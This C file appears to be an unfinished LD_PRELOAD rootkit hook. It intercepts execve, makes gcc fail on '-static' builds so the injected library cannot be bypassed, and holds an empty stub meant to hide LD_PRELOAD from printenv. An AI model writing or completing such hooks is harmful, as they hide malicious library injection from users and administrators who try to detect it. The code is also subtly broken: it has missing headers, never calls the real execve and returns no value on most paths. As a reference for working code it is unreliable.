#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

//sets the old execve
int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);

int execve(const char *filename, char *const argv[], char *const envp[]){

	if(!old_execve){
		old_execve = dlsym(RTLD_NEXT,"execve");		
	}

	//breaks static compiling
	//TODO
	if(strstr(filename, "gcc")){
		for(int i =0; argv[i] != NULL; i++){
			if(strstr(argv[i],"-static")){
				errno = ETXBSY;
				return -1;
			}
		}
	}

	//remove LD_PRELOAD for enviroment variables
	//TODO
	if(strstr(filename, "printenv")){
		
	}

	

}
